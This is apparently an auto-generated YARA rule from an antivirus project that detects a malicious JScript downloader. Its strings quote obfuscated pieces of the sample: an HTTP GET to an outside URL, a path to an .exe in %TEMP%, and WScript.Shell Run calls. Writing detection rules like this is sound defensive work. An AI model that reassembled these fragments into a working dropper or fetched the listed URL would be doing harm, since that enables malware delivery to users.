rule sig_20160329_2f6904274a02ef7e3f2a53a28958d3c2 {
  meta:
    description = "datamaliciousorder - file 20160329_2f6904274a02ef7e3f2a53a28958d3c2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "023ac6180dd614af3414d509f79d0377bd014c3d21c4edbd2478f3b3e4426f1f"

  strings:
    $s1  = "Sc[aY](\"GET\", \"http://blog.insite.pt/m8djs\", false);" fullword ascii
    $s2  = "function Pa() {return E[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"5eUmT2twG31SMg.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[Sl](sH() * 11); if (Sc[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function R(QZ, r){p = p * 1; return QZ - r;};" fullword ascii
    $s5  = "var E = function CB() {return WScript[sX](\"WScript.Shell\");}(), GX = 11;" fullword ascii
    $s6  = "function zW(){return \"\" + P;};" fullword ascii
    $s7  = "function Zg(R0){E[\"Run\"](R0, p, p);};" fullword ascii
    $s8  = "function pl() {return ((Nj == true) && (Nj == k)) ? 1 : p;};" fullword ascii
    $s9  = " while (V){" fullword ascii
    $s10 = "function t()" fullword ascii
    $s11 = "var y = new this[\"Date\"]();" fullword ascii
    $s12 = "function Pi(){return sX;};" fullword ascii
    $s13 = "function f(fc) {var e = (1, 2, 3, 4, 5, fc); return e;};" fullword ascii
    $s14 = "function sH(){return 22;};" fullword ascii
    $s15 = "return R(R1, hw);" fullword ascii
    $s16 = "var k = false;" fullword ascii
    $s17 = "k = true; " fullword ascii
    $s18 = "var J = false;" fullword ascii
    $s19 = "var Nj = false;" fullword ascii
    $s20 = "Nj = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}